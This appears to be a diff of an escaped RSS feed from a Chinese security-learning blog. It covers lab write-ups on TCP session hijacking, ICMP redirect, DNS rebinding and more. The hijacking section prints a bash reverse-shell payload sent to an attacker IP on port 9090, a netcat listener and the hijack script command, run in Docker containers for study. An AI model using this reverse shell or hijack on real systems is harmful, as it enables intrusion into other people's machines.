+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/bin/bash -i &amp;gt;/dev/tcp/10.9.0.1/9090 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;这条命令会让目标主机启动一个交互式 Bash，并把输入输出重定向到攻击者的 &lt;code&gt;9090&lt;/code&gt; 端口&lt;/p&gt;
-&lt;h3 id=&#34;攻击者监听&#34;&gt;攻击者监听
-&lt;/h3&gt;&lt;p&gt;在攻击者容器中新开一个终端窗口，监听 &lt;code&gt;9090&lt;/code&gt; 端口&lt;/p&gt;
+&lt;/div&gt;&lt;h3 id=&#34;攻击者-3&#34;&gt;攻击者
+&lt;/h3&gt;&lt;p&gt;在攻击者容器中新开一个终端监听 &lt;code&gt;9090&lt;/code&gt; 端口&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -273,39 +853,26 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -lnv 9090
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;img src=&#34;11.png&#34; style=&#34;width: 80%;&#34; /&gt;
-&lt;h3 id=&#34;执行劫持&#34;&gt;执行劫持
-&lt;/h3&gt;&lt;p&gt;在攻击者原来的终端中运行会话劫持脚本&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;在攻击者原来的终端执行攻击脚本&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 hijacking_auto.py 10.9.0.5 10.9.0.6
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 hijacking_auto.py 10.9.0.5 10.9.0.6
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;回到受害者 Telnet 界面，连续输入 10 个字符触发脚本注入&lt;/p&gt;
-&lt;img src=&#34;12.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;/div&gt;&lt;p&gt;在受害者 Telnet 界面中连续输入10个字符来触发注入&lt;/p&gt;
+&lt;img src=&#34;11.png&#34; style=&#34;width: 100%;&#34; /&gt;
 &lt;h3 id=&#34;验证-3&#34;&gt;验证
-&lt;/h3&gt;&lt;p&gt;回到攻击者监听 &lt;code&gt;9090&lt;/code&gt; 端口的窗口，如果攻击成功，可以看到来自 &lt;code&gt;10.9.0.6&lt;/code&gt; 的连接，并获得目标主机的命令执行环境&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;whoami
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hostname
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ip addr
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;img src=&#34;13.png&#34; style=&#34;width: 90%;&#34; /&gt;
-&lt;p&gt;这说明攻击者已经通过 TCP 会话劫持向 Telnet 会话中注入了反向 Shell 命令，并让目标主机主动连接攻击者&lt;/p&gt;
-&lt;h2 id=&#34;实验结论&#34;&gt;实验结论
-&lt;/h2&gt;&lt;p&gt;本次实验展示了 TCP 协议在不同场景下可能受到的攻击方式。SYN 洪泛攻击利用的是连接建立阶段的半连接状态，TCP Reset 攻击利用的是 RST 报文对已有连接的控制能力，TCP 会话劫持利用的是明文协议和 TCP 状态可伪造的问题，反向 Shell 则是在命令注入成功后的进一步利用&lt;/p&gt;
-&lt;p&gt;这几个实验的共同点是攻击者都需要让伪造数据包看起来符合当前 TCP 状态。源 IP、目标 IP、端口、序列号和确认号只要有关键字段不匹配，目标主机就可能直接丢弃数据包&lt;/p&gt;
-&lt;p&gt;从实验过程可以看出，TCP 本身只负责可靠传输，并不会验证通信双方的真实身份。对于 Telnet 这类明文协议来说，一旦攻击者能够监听或伪造会话数据，连接就很容易被干扰或劫持。实际环境中通常需要依赖 SSH、TLS、SYN Cookie、随机化初始序列号、防火墙规则等机制降低这类攻击的风险&lt;/p&gt;
+&lt;/h3&gt;&lt;p&gt;回到攻击者的监听窗口，如果攻击成功，可以看到&lt;code&gt;Connection received on 10.9.0.6 51962&lt;/code&gt;，后面的命令提示符也变成了&lt;code&gt;seed@099c6246dd29&lt;/code&gt;，也就是用户的容器名称，这时攻击者输入的命令会直接作用在用户的主机上&lt;/p&gt;
+&lt;p&gt;我这里创建了一个txt文件，回到用户容器查看这个文件，可以看到正是刚刚在攻击者容器写入的内容&lt;/p&gt;
+&lt;img src=&#34;12.png&#34; style=&#34;width: 80%;&#34; /&gt;
+&lt;p&gt;在攻击者端还可以看到用户容器中的所有文件，这会导致信息泄露等问题&lt;/p&gt;
+&lt;img src=&#34;13.png&#34; style=&#34;width: 50%;&#34; /&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Telnet协议是不安全的，使用明文传输，攻击者可以直接获取通信内容。因此日常应该尽量避免使用这个协议，转而使用更安全的SSH协议&lt;/p&gt;
+&lt;/blockquote&gt;
 </description>
         </item>
         <item>
@@ -2767,7 +3334,7 @@
         <description>&lt;img src="https://th4uma.github.io/images/cover/icmp.jpg" alt="Featured image of post ICMP重定向与中间人攻击" /&gt;&lt;h2 id=&#34;实验环境&#34;&gt;实验环境
 &lt;/h2&gt;&lt;p&gt;我使用的是 Ubuntu  24.04.4，基本环境配置见&lt;a class=&#34;link&#34; href=&#34;https://th4uma.github.io/post/arp/#%e5%87%86%e5%a4%87&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;ARP攻击原理学习&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;启动实验前，对容器环境进行清理，避免之前的网络配置干扰&lt;/p&gt;
+&lt;p&gt;启动实验前先清理容器环境，防止被之前的网络配置干扰&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -2803,45 +3370,45 @@
 &lt;/div&gt;&lt;/blockquote&gt;
 &lt;p&gt;网络结构包括受害者、攻击者、真实网关、恶意路由器以及目标主机&lt;/p&gt;
 &lt;table&gt;
-  &lt;thead&gt;
-      &lt;tr&gt;
-          &lt;th&gt;&lt;strong&gt;节点&lt;/strong&gt;&lt;/th&gt;
-          &lt;th&gt;&lt;strong&gt;IP 地址&lt;/strong&gt;&lt;/th&gt;
-          &lt;th&gt;&lt;strong&gt;作用说明&lt;/strong&gt;&lt;/th&gt;
-      &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;受害者主机&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;10.9.0.5&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;攻击目标。初始路由指向 &lt;code&gt;.11&lt;/code&gt;&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;真实路由器&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;10.9.0.11&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;连接两个网段的实际节点。它同时拥有 &lt;code&gt;10.9.0.11&lt;/code&gt; 和 &lt;code&gt;192.168.60.11&lt;/code&gt; 两个 IP&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;恶意路由器&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;10.9.0.111&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;攻击者诱导流量去往的中间人节点&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;攻击者主机&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;10.9.0.105&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;发送伪造 ICMP 重定向报文的节点&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;目标主机&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;192.168.60.5&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;位于另一个网段的通信目标&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;Docker 网关&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;10.9.0.1&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;Docker 虚拟网络的默认出口，不参与实验&lt;/td&gt;
-      &lt;/tr&gt;
-  &lt;/tbody&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;&lt;strong&gt;节点&lt;/strong&gt;&lt;/th&gt;
+					&lt;th&gt;&lt;strong&gt;IP 地址&lt;/strong&gt;&lt;/th&gt;
+					&lt;th&gt;&lt;strong&gt;作用说明&lt;/strong&gt;&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;受害者主机&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;10.9.0.5&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;攻击目标。初始路由指向 &lt;code&gt;.11&lt;/code&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;真实路由器&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;10.9.0.11&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;连接两个网段的实际节点。它同时拥有 &lt;code&gt;10.9.0.11&lt;/code&gt; 和 &lt;code&gt;192.168.60.11&lt;/code&gt; 两个 IP&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;恶意路由器&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;10.9.0.111&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;攻击者诱导流量去往的中间人节点&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;攻击者主机&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;10.9.0.105&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;发送伪造 ICMP 重定向报文的节点&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;目标主机&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;192.168.60.5&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;位于另一个网段的通信目标&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;Docker 网关&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;10.9.0.1&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;Docker 虚拟网络的默认出口，不参与实验&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
 &lt;/table&gt;
 &lt;h2 id=&#34;icmp-重定向攻击&#34;&gt;ICMP 重定向攻击
 &lt;/h2&gt;&lt;p&gt;ICMP Redirect 用于局域网优化路径。主机将数据包发送给网关时，如果网关发现存在更优的路径，会返回一个重定向报文来让主机更新路由缓存，之后的数据包就会经过新的网关。这个机制缺少认证，只要报文结构合法而且来源看似可信，就有可能被内核接受，因此可以伪造重定向来进行攻击&lt;/p&gt;
@@ -8474,45 +9041,45 @@
 &lt;p&gt;实验成功后，在源码目录执行 &lt;code&gt;make clean&lt;/code&gt; 清除编译文件&lt;/p&gt;
 &lt;h2 id=&#34;附ubuntu-和-openeuler-的差异&#34;&gt;附：Ubuntu 和 openEuler 的差异
 &lt;/h2&gt;&lt;table&gt;
-  &lt;thead&gt;
-      &lt;tr&gt;
-          &lt;th&gt;&lt;strong&gt;对比项&lt;/strong&gt;&lt;/th&gt;
-          &lt;th&gt;&lt;strong&gt;openEuler (ARM64)&lt;/strong&gt;&lt;/th&gt;
-          &lt;th&gt;&lt;strong&gt;Ubuntu (x86_64)&lt;/strong&gt;&lt;/th&gt;
-      &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;包管理器&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;yum&lt;/code&gt; / &lt;code&gt;dnf&lt;/code&gt; (RPM系)&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;apt&lt;/code&gt; (Debian系)&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;架构特定目录&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;arch/arm64/&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;arch/x86/&lt;/code&gt;&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;内核镜像目标&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;Image&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;bzImage&lt;/code&gt;&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;设备树 (DTB)&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;需要编译 &lt;code&gt;dtbs&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;x86平台不需要编译 &lt;code&gt;dtbs&lt;/code&gt;&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;系统调用表位置&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;include/uapi/asm-generic/unistd.h&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;arch/x86/entry/syscalls/syscall_64.tbl&lt;/code&gt;&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;调用约定&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;依赖ARM64特定的调用约定和寄存器&lt;/td&gt;
-          &lt;td&gt;依赖 x86_64 调用约定与 &lt;code&gt;SYSCALL_DEFINE&lt;/code&gt; 宏&lt;/td&gt;
-      &lt;/tr&gt;
-  &lt;/tbody&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;&lt;strong&gt;对比项&lt;/strong&gt;&lt;/th&gt;
+					&lt;th&gt;&lt;strong&gt;openEuler (ARM64)&lt;/strong&gt;&lt;/th&gt;
+					&lt;th&gt;&lt;strong&gt;Ubuntu (x86_64)&lt;/strong&gt;&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;包管理器&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;yum&lt;/code&gt; / &lt;code&gt;dnf&lt;/code&gt; (RPM系)&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;apt&lt;/code&gt; (Debian系)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;架构特定目录&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;arch/arm64/&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;arch/x86/&lt;/code&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;内核镜像目标&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;Image&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;bzImage&lt;/code&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;设备树 (DTB)&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;需要编译 &lt;code&gt;dtbs&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;x86平台不需要编译 &lt;code&gt;dtbs&lt;/code&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;系统调用表位置&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;include/uapi/asm-generic/unistd.h&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;arch/x86/entry/syscalls/syscall_64.tbl&lt;/code&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;调用约定&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;依赖ARM64特定的调用约定和寄存器&lt;/td&gt;
+					&lt;td&gt;依赖 x86_64 调用约定与 &lt;code&gt;SYSCALL_DEFINE&lt;/code&gt; 宏&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
 &lt;/table&gt;
 </description>
         </item>
@@ -9184,42 +9751,42 @@
     &gt;ARP攻击原理学习&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;核心工具：Docker / Docker-Compose、Firefox浏览器、nano / vim&lt;/p&gt;
 &lt;table&gt;
-  &lt;thead&gt;
-      &lt;tr&gt;
-          &lt;th&gt;节点类型&lt;/th&gt;
-          &lt;th&gt;IP 地址&lt;/th&gt;
-          &lt;th&gt;域名&lt;/th&gt;
-          &lt;th&gt;作用说明&lt;/th&gt;
-      &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-      &lt;tr&gt;
-          &lt;td&gt;靶机（IoT 恒温器）&lt;/td&gt;
-          &lt;td&gt;192.168.60.80&lt;/td&gt;
-          &lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.seedIoT32.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;节点类型&lt;/th&gt;
+					&lt;th&gt;IP 地址&lt;/th&gt;
+					&lt;th&gt;域名&lt;/th&gt;
+					&lt;th&gt;作用说明&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;靶机（IoT 恒温器）&lt;/td&gt;
+					&lt;td&gt;192.168.60.80&lt;/td&gt;
+					&lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.seedIoT32.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;www.seedIoT32.com&lt;/a&gt;&lt;/td&gt;
-          &lt;td&gt;位于内网，被路由器防火墙保护的目标设备&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;本地 DNS 缓存服务器&lt;/td&gt;
-          &lt;td&gt;10.9.0.53&lt;/td&gt;
-          &lt;td&gt;无&lt;/td&gt;
-          &lt;td&gt;模拟受害者网络中的 DNS 解析与缓存&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;攻击者 Web 服务器&lt;/td&gt;
-          &lt;td&gt;10.9.0.180&lt;/td&gt;
-          &lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.attacker32.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+					&lt;td&gt;位于内网，被路由器防火墙保护的目标设备&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;本地 DNS 缓存服务器&lt;/td&gt;
+					&lt;td&gt;10.9.0.53&lt;/td&gt;
+					&lt;td&gt;无&lt;/td&gt;
+					&lt;td&gt;模拟受害者网络中的 DNS 解析与缓存&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;攻击者 Web 服务器&lt;/td&gt;
+					&lt;td&gt;10.9.0.180&lt;/td&gt;
+					&lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.attacker32.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;www.attacker32.com&lt;/a&gt;&lt;/td&gt;
-          &lt;td&gt;提供恶意网页或脚本&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;攻击者 DNS 服务器&lt;/td&gt;
-          &lt;td&gt;10.9.0.153&lt;/td&gt;
-          &lt;td&gt;无&lt;/td&gt;
-          &lt;td&gt;解析，实现 DNS 重绑定&lt;/td&gt;
-      &lt;/tr&gt;
-  &lt;/tbody&gt;
+					&lt;td&gt;提供恶意网页或脚本&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;攻击者 DNS 服务器&lt;/td&gt;
+					&lt;td&gt;10.9.0.153&lt;/td&gt;
+					&lt;td&gt;无&lt;/td&gt;
+					&lt;td&gt;解析，实现 DNS 重绑定&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
 &lt;/table&gt;
 &lt;h2 id=&#34;修改firefox浏览器的dns缓存时间&#34;&gt;修改Firefox浏览器的DNS缓存时间
 &lt;/h2&gt;&lt;blockquote&gt;
@@ -10860,34 +11427,34 @@
 &lt;/ul&gt;
 &lt;p&gt;&lt;strong&gt;推荐的分区方式&lt;/strong&gt;&lt;/p&gt;
 &lt;table&gt;
-  &lt;thead&gt;
-      &lt;tr&gt;
-          &lt;th style=&#34;text-align: center&#34;&gt;安装过程的挂载点&lt;/th&gt;
-          &lt;th style=&#34;text-align: center&#34;&gt;分区&lt;/th&gt;
-          &lt;th style=&#34;text-align: center&#34;&gt;分区类型&lt;/th&gt;
-          &lt;th style=&#34;text-align: center&#34;&gt;推荐大小&lt;/th&gt;
-      &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-      &lt;tr&gt;
-          &lt;td style=&#34;text-align: center&#34;&gt;/mnt/boot&lt;/td&gt;
-          &lt;td style=&#34;text-align: center&#34;&gt;&lt;em&gt;/dev/efi_system_partition&lt;/em&gt;&lt;/td&gt;
-          &lt;td style=&#34;text-align: center&#34;&gt;EFI System&lt;/td&gt;
-          &lt;td style=&#34;text-align: center&#34;&gt;1G&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td style=&#34;text-align: center&#34;&gt;[SWAP]&lt;/td&gt;
-          &lt;td style=&#34;text-align: center&#34;&gt;&lt;em&gt;/dev/swap_partition&lt;/em&gt;&lt;/td&gt;
-          &lt;td style=&#34;text-align: center&#34;&gt;Linux swap&lt;/td&gt;
-          &lt;td style=&#34;text-align: center&#34;&gt;4G&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td style=&#34;text-align: center&#34;&gt;/mnt&lt;/td&gt;
-          &lt;td style=&#34;text-align: center&#34;&gt;/dev/root_partition&lt;/td&gt;
-          &lt;td style=&#34;text-align: center&#34;&gt;Linux filesystem&lt;/td&gt;
-          &lt;td style=&#34;text-align: center&#34;&gt;设备的所有剩余空间，至少20G&lt;/td&gt;
-      &lt;/tr&gt;
-  &lt;/tbody&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th style=&#34;text-align: center&#34;&gt;安装过程的挂载点&lt;/th&gt;
+					&lt;th style=&#34;text-align: center&#34;&gt;分区&lt;/th&gt;
+					&lt;th style=&#34;text-align: center&#34;&gt;分区类型&lt;/th&gt;
+					&lt;th style=&#34;text-align: center&#34;&gt;推荐大小&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td style=&#34;text-align: center&#34;&gt;/mnt/boot&lt;/td&gt;
+					&lt;td style=&#34;text-align: center&#34;&gt;&lt;em&gt;/dev/efi_system_partition&lt;/em&gt;&lt;/td&gt;
+					&lt;td style=&#34;text-align: center&#34;&gt;EFI System&lt;/td&gt;
+					&lt;td style=&#34;text-align: center&#34;&gt;1G&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td style=&#34;text-align: center&#34;&gt;[SWAP]&lt;/td&gt;
+					&lt;td style=&#34;text-align: center&#34;&gt;&lt;em&gt;/dev/swap_partition&lt;/em&gt;&lt;/td&gt;
+					&lt;td style=&#34;text-align: center&#34;&gt;Linux swap&lt;/td&gt;
+					&lt;td style=&#34;text-align: center&#34;&gt;4G&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td style=&#34;text-align: center&#34;&gt;/mnt&lt;/td&gt;
+					&lt;td style=&#34;text-align: center&#34;&gt;/dev/root_partition&lt;/td&gt;
+					&lt;td style=&#34;text-align: center&#34;&gt;Linux filesystem&lt;/td&gt;
+					&lt;td style=&#34;text-align: center&#34;&gt;设备的所有剩余空间，至少20G&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
 &lt;/table&gt;
 &lt;h3 id=&#34;分区操作&#34;&gt;分区操作
 &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;注意：不同电脑的磁盘和分区不一样，之后的操作需要以自己磁盘的情况为准，千万不要搞错磁盘设备名，否则很可能导致数据丢失&lt;/strong&gt;&lt;/p&gt;
@@ -11118,75 +11685,75 @@
 &lt;img src=&#34;22.jpg&#34; style=&#34;width: 70%;&#34; /&gt;
 &lt;h3 id=&#34;安装软件包&#34;&gt;安装软件包
 &lt;/h3&gt;&lt;table&gt;
-  &lt;thead&gt;
-      &lt;tr&gt;
-          &lt;th&gt;&lt;strong&gt;名称&lt;/strong&gt;&lt;/th&gt;
-          &lt;th&gt;&lt;strong&gt;作用&lt;/strong&gt;&lt;/th&gt;
-          &lt;th&gt;&lt;strong&gt;备注&lt;/strong&gt;&lt;/th&gt;
-      &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;base&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;系统的最基础组件&lt;/td&gt;
